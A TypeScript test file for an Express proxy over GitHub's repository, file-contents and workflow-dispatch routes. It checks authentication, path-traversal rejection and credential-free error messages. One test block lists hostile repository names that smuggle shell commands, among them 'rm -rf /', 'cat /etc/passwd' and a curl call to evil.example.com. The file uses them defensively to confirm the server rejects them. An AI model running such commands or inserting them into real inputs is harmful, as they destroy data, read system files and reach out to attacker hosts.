/**
 * github.test.ts — integration tests for the GitHub proxy routes.
 *
 * Covers:
 *   GET  /repos                         — list repos
 *   GET  /repos/:owner/:repo/contents/*  — read file/dir
 *   PUT  /repos/:owner/:repo/contents/*  — create/update file
 *   DELETE /repos/:owner/:repo/contents/* — delete file
 *   POST /repos/:owner/:repo/actions/workflows/:wf/dispatches — trigger workflow
 *   GET  /repos/:owner/:repo/actions/runs — list runs
 */
import { describe, it, expect, vi, beforeEach } from "vitest";
import http from "http";
import express from "express";
import request from "supertest";

const octokitMock = {
  repos: {
    listForAuthenticatedUser: vi.fn(),
    getContent: vi.fn(),
    createOrUpdateFileContents: vi.fn(),
    deleteFile: vi.fn(),
  },
  actions: {
    createWorkflowDispatch: vi.fn(),
    listWorkflowRunsForRepo: vi.fn(),
    getWorkflowRun: vi.fn(),
  },
};

vi.mock("../../lib/github.js", () => ({
  getGithubClient: vi.fn(() => octokitMock),
}));

vi.mock("@clerk/express", () => ({
  clerkMiddleware: vi.fn(() => (_req: unknown, _res: unknown, next: () => void) => next()),
  getAuth: vi.fn(() => ({ userId: null })),
}));

import githubRouter, { isPathSafe } from "../github.js";
import { getGithubClient } from "../../lib/github.js";

const getGithubClientMock = getGithubClient as ReturnType<typeof vi.fn>;

const E2E_USER = "user_e2e_github_test";

function makeApp() {
  const app = express();
  app.use(express.json());
  app.use(githubRouter);
  return app;
}

/**
 * Sends a raw HTTP request to an ephemeral server, bypassing the URL
 * normalization that supertest/Node.js apply before dispatch.  This lets us
 * send literal `..` segments and confirm Express route handlers reject them.
 */
function rawRequest(
  app: express.Express,
  method: string,
  rawPath: string,
  headers: Record<string, string> = {},
  body?: unknown,
): Promise<{ status: number; body: unknown }> {
  return new Promise((resolve, reject) => {
    const server = app.listen(0, "127.0.0.1", () => {
      const port = (server.address() as { port: number }).port;
      const bodyStr = body !== undefined ? JSON.stringify(body) : undefined;
      const reqHeaders: Record<string, string> = {
        "x-e2e-user-id": "user_e2e_github_test",
        ...headers,
        ...(bodyStr !== undefined
          ? { "content-type": "application/json", "content-length": String(Buffer.byteLength(bodyStr)) }
          : {}),
      };
      const req = http.request(
        { host: "127.0.0.1", port, path: rawPath, method, headers: reqHeaders },
        (res) => {
          let raw = "";
          res.on("data", (c: Buffer) => { raw += c.toString(); });
          res.on("end", () => {
            server.close();
            try { resolve({ status: res.statusCode ?? 0, body: JSON.parse(raw) }); }
            catch { resolve({ status: res.statusCode ?? 0, body: raw }); }
          });
        },
      );
      req.on("error", (e) => { server.close(); reject(e); });
      if (bodyStr !== undefined) req.write(bodyStr);
      req.end();
    });
  });
}

beforeEach(() => {
  vi.stubEnv("E2E_AUTH_BYPASS", "1");
  octokitMock.repos.listForAuthenticatedUser.mockReset();
  octokitMock.repos.getContent.mockReset();
  octokitMock.repos.createOrUpdateFileContents.mockReset();
  octokitMock.repos.deleteFile.mockReset();
  octokitMock.actions.createWorkflowDispatch.mockReset();
  octokitMock.actions.listWorkflowRunsForRepo.mockReset();
  octokitMock.actions.getWorkflowRun.mockReset();
  getGithubClientMock.mockReturnValue(octokitMock);
});

describe("GET /repos — list repositories", () => {
  it("returns 401 when unauthenticated", async () => {
    vi.stubEnv("E2E_AUTH_BYPASS", "0");
    const res = await request(makeApp()).get("/repos");
    expect(res.status).toBe(401);
  });

  it("returns repos from Octokit", async () => {
    octokitMock.repos.listForAuthenticatedUser.mockResolvedValue({
      data: [{ id: 1, name: "my-repo", full_name: "owner/my-repo" }],
    });
    const res = await request(makeApp())
      .get("/repos")
      .set("x-e2e-user-id", E2E_USER);
    expect(res.status).toBe(200);
    expect(Array.isArray(res.body)).toBe(true);
  });

  it("returns github_error when GITHUB_TOKEN is missing", async () => {
    getGithubClientMock.mockImplementation(() => {
      throw new Error("GITHUB_TOKEN not set");
    });
    const res = await request(makeApp())
      .get("/repos")
      .set("x-e2e-user-id", E2E_USER);
    expect(res.status).toBe(500);
    expect(res.body.error).toBe("github_error");
  });
});

describe("isPathSafe — path traversal guard", () => {
  it("allows a normal file path", () => {
    expect(isPathSafe("src/components/App.tsx")).toBe(true);
  });

  it("allows an empty path", () => {
    expect(isPathSafe("")).toBe(true);
  });

  it("allows a path whose segment merely contains dots (not pure '..')", () => {
    expect(isPathSafe("foo..bar/baz")).toBe(true);
  });

  it("rejects a pure '..' segment", () => {
    expect(isPathSafe("../secret")).toBe(false);
  });

  it("rejects '..' in the middle of a path", () => {
    expect(isPathSafe("foo/../secret")).toBe(false);
  });

  it("rejects a path that is only '..'", () => {
    expect(isPathSafe("..")).toBe(false);
  });
});

describe("GET /repos/:owner/:repo/contents/*path — read file", () => {
  it("returns 400 for invalid owner characters", async () => {
    const res = await request(makeApp())
      .get("/repos/bad owner/repo/contents/README.md")
      .set("x-e2e-user-id", E2E_USER);
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_params");
  });

  it("returns 400 for path traversal '..' segment (raw request bypasses client normalization)", async () => {
    const res = await rawRequest(makeApp(), "GET", "/repos/owner/repo/contents/../secret");
    expect(res.status).toBe(400);
    expect((res.body as { error: string }).error).toBe("invalid_params");
    expect((res.body as { details: string }).details).toMatch(/traversal/);
  });

  it("returns file content on success", async () => {
    octokitMock.repos.getContent.mockResolvedValue({
      data: { type: "file", name: "README.md", content: "aGVsbG8=" },
    });
    const res = await request(makeApp())
      .get("/repos/owner/repo/contents/README.md")
      .set("x-e2e-user-id", E2E_USER);
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty("name", "README.md");
  });
});

describe("PUT /repos/:owner/:repo/contents/*path — create/update file", () => {
  it("returns 400 for invalid owner characters", async () => {
    const res = await request(makeApp())
      .put("/repos/bad owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "add file", content: "aGVsbG8=" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_params");
  });

  it("returns 400 for path traversal '..' segment (raw request bypasses client normalization)", async () => {
    const res = await rawRequest(makeApp(), "PUT", "/repos/owner/repo/contents/../secret", {}, {
      message: "add file",
      content: "aGVsbG8=",
    });
    expect(res.status).toBe(400);
    expect((res.body as { error: string }).error).toBe("invalid_params");
    expect((res.body as { details: string }).details).toMatch(/traversal/);
  });

  it("returns 400 when message is missing", async () => {
    const res = await request(makeApp())
      .put("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ content: "aGVsbG8=" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns 400 when content is missing", async () => {
    const res = await request(makeApp())
      .put("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "add file" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns 400 when message is not a string", async () => {
    const res = await request(makeApp())
      .put("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: 42, content: "aGVsbG8=" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns 400 when content is not a string", async () => {
    const res = await request(makeApp())
      .put("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "add file", content: true });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns file result on success", async () => {
    octokitMock.repos.createOrUpdateFileContents.mockResolvedValue({
      data: { commit: { sha: "abc123" }, content: { name: "file.txt" } },
    });
    const res = await request(makeApp())
      .put("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "add file", content: "aGVsbG8=" });
    expect(res.status).toBe(200);
  });
});

describe("DELETE /repos/:owner/:repo/contents/*path — delete file", () => {
  it("returns 400 for invalid owner characters", async () => {
    const res = await request(makeApp())
      .delete("/repos/bad owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "delete file", sha: "abc123" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_params");
  });

  it("returns 400 for path traversal '..' segment (raw request bypasses client normalization)", async () => {
    const res = await rawRequest(makeApp(), "DELETE", "/repos/owner/repo/contents/../secret", {}, {
      message: "delete file",
      sha: "abc123",
    });
    expect(res.status).toBe(400);
    expect((res.body as { error: string }).error).toBe("invalid_params");
    expect((res.body as { details: string }).details).toMatch(/traversal/);
  });

  it("returns 400 when message is missing", async () => {
    const res = await request(makeApp())
      .delete("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ sha: "abc123" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns 400 when sha is missing", async () => {
    const res = await request(makeApp())
      .delete("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "delete file" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns 400 when sha is not a string", async () => {
    const res = await request(makeApp())
      .delete("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "delete file", sha: 99 });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });
});

describe("POST /repos/:owner/:repo/actions/workflows/:workflow_id/dispatches", () => {
  it("returns 400 for invalid owner characters", async () => {
    const res = await request(makeApp())
      .post("/repos/bad owner/repo/actions/workflows/deploy/dispatches")
      .set("x-e2e-user-id", E2E_USER)
      .send({ ref: "main" });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_params");
  });

  it("returns 400 when ref is missing", async () => {
    const res = await request(makeApp())
      .post("/repos/owner/repo/actions/workflows/deploy/dispatches")
      .set("x-e2e-user-id", E2E_USER)
      .send({});
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns 400 when ref is not a string", async () => {
    const res = await request(makeApp())
      .post("/repos/owner/repo/actions/workflows/deploy/dispatches")
      .set("x-e2e-user-id", E2E_USER)
      .send({ ref: 123 });
    expect(res.status).toBe(400);
    expect(res.body.error).toBe("invalid_request");
  });

  it("returns 204 on success", async () => {
    octokitMock.actions.createWorkflowDispatch.mockResolvedValue({});
    const res = await request(makeApp())
      .post("/repos/owner/repo/actions/workflows/deploy/dispatches")
      .set("x-e2e-user-id", E2E_USER)
      .send({ ref: "main" });
    expect(res.status).toBe(204);
  });
});

describe("GET /repos/:owner/:repo/actions/runs — list workflow runs", () => {
  it("returns runs list on success", async () => {
    octokitMock.actions.listWorkflowRunsForRepo.mockResolvedValue({
      data: {
        total_count: 1,
        workflow_runs: [{
          id: 42,
          name: "CI",
          status: "completed",
          conclusion: "success",
          created_at: "2026-01-01T00:00:00Z",
          html_url: "https://github.com",
          workflow_id: 1,
        }],
      },
    });
    const res = await request(makeApp())
      .get("/repos/owner/repo/actions/runs")
      .set("x-e2e-user-id", E2E_USER);
    expect(res.status).toBe(200);
    expect(res.body.total_count).toBe(1);
    expect(res.body.workflow_runs).toHaveLength(1);
  });
});

describe("repo-name injection — shell-special characters rejected before GitHub API is called", () => {
  const SPECIAL_REPOS = [
    { label: "semicolon",  repo: "my-repo;rm -rf /" },
    { label: "backtick",   repo: "my-repo`whoami`"  },
    { label: "pipe",       repo: "my-repo|cat /etc/passwd" },
    { label: "ampersand",  repo: "my-repo&&curl evil.example.com" },
    { label: "dollar",     repo: "my-repo$HOME" },
  ];

  describe("dispatch route — POST .../dispatches", () => {
    for (const { label, repo } of SPECIAL_REPOS) {
      it(`returns 400 and does not call GitHub when repo contains ${label}`, async () => {
        const encodedRepo = encodeURIComponent(repo);
        const res = await request(makeApp())
          .post(`/repos/owner/${encodedRepo}/actions/workflows/deploy.yml/dispatches`)
          .set("x-e2e-user-id", E2E_USER)
          .send({ ref: "main" });
        expect(res.status).toBe(400);
        expect(res.body.error).toBe("invalid_params");
        expect(octokitMock.actions.createWorkflowDispatch).not.toHaveBeenCalled();
      });
    }
  });

  describe("contents GET route — special characters in owner rejected", () => {
    for (const { label } of SPECIAL_REPOS) {
      const badOwner = `owner;${label}`;
      it(`returns 400 and does not call GitHub when owner contains ${label}`, async () => {
        const encodedOwner = encodeURIComponent(badOwner);
        const res = await request(makeApp())
          .get(`/repos/${encodedOwner}/repo/contents/README.md`)
          .set("x-e2e-user-id", E2E_USER);
        expect(res.status).toBe(400);
        expect(res.body.error).toBe("invalid_params");
        expect(octokitMock.repos.getContent).not.toHaveBeenCalled();
      });
    }
  });

  describe("contents PUT route — special characters in repo rejected", () => {
    for (const { label, repo } of SPECIAL_REPOS) {
      it(`returns 400 and does not call GitHub when repo contains ${label}`, async () => {
        const encodedRepo = encodeURIComponent(repo);
        const res = await request(makeApp())
          .put(`/repos/owner/${encodedRepo}/contents/file.txt`)
          .set("x-e2e-user-id", E2E_USER)
          .send({ message: "add file", content: "aGVsbG8=" });
        expect(res.status).toBe(400);
        expect(res.body.error).toBe("invalid_params");
        expect(octokitMock.repos.createOrUpdateFileContents).not.toHaveBeenCalled();
      });
    }
  });

  describe("contents DELETE route — special characters in repo rejected", () => {
    for (const { label, repo } of SPECIAL_REPOS) {
      it(`returns 400 and does not call GitHub when repo contains ${label}`, async () => {
        const encodedRepo = encodeURIComponent(repo);
        const res = await request(makeApp())
          .delete(`/repos/owner/${encodedRepo}/contents/file.txt`)
          .set("x-e2e-user-id", E2E_USER)
          .send({ message: "remove file", sha: "abc123" });
        expect(res.status).toBe(400);
        expect(res.body.error).toBe("invalid_params");
        expect(octokitMock.repos.deleteFile).not.toHaveBeenCalled();
      });
    }
  });
});

describe("PAT expiry / GitHub 401 — proxy returns safe error with no credential leak", () => {
  function makeOctokitUnauthorizedError(message = "Bad credentials") {
    const err = new Error(message) as Error & { status: number };
    err.status = 401;
    return err;
  }

  it("GET /repos returns 401 with generic error body when PAT is expired", async () => {
    octokitMock.repos.listForAuthenticatedUser.mockRejectedValue(
      makeOctokitUnauthorizedError(),
    );
    const res = await request(makeApp())
      .get("/repos")
      .set("x-e2e-user-id", E2E_USER);
    expect(res.status).toBe(401);
    expect(res.body.error).toBe("github_error");
    expect(typeof res.body.details).toBe("string");
    expect(res.body.details).not.toMatch(/ghp_/i);
    expect(res.body.details).not.toMatch(/token/i);
    expect(res.body.details).not.toMatch(/secret/i);
  });

  it("GET /repos/.../contents returns 401 with generic error body when PAT is expired", async () => {
    octokitMock.repos.getContent.mockRejectedValue(
      makeOctokitUnauthorizedError(),
    );
    const res = await request(makeApp())
      .get("/repos/owner/repo/contents/README.md")
      .set("x-e2e-user-id", E2E_USER);
    expect(res.status).toBe(401);
    expect(res.body.error).toBe("github_error");
    expect(res.body.details).not.toMatch(/ghp_/i);
    expect(res.body.details).not.toMatch(/token/i);
  });

  it("POST .../dispatches returns 401 with generic error body when PAT is expired", async () => {
    octokitMock.actions.createWorkflowDispatch.mockRejectedValue(
      makeOctokitUnauthorizedError("Bad credentials"),
    );
    const res = await request(makeApp())
      .post("/repos/owner/repo/actions/workflows/deploy.yml/dispatches")
      .set("x-e2e-user-id", E2E_USER)
      .send({ ref: "main" });
    expect(res.status).toBe(401);
    expect(res.body.error).toBe("github_error");
    expect(res.body.details).not.toMatch(/ghp_/i);
    expect(res.body.details).not.toMatch(/token/i);
  });

  it("PUT .../contents returns 401 with generic error body when PAT is revoked mid-session", async () => {
    octokitMock.repos.createOrUpdateFileContents.mockRejectedValue(
      makeOctokitUnauthorizedError("Credentials revoked"),
    );
    const res = await request(makeApp())
      .put("/repos/owner/repo/contents/file.txt")
      .set("x-e2e-user-id", E2E_USER)
      .send({ message: "update", content: "aGVsbG8=" });
    expect(res.status).toBe(401);
    expect(res.body.error).toBe("github_error");
    expect(res.body.details).not.toMatch(/ghp_/i);
  });

});
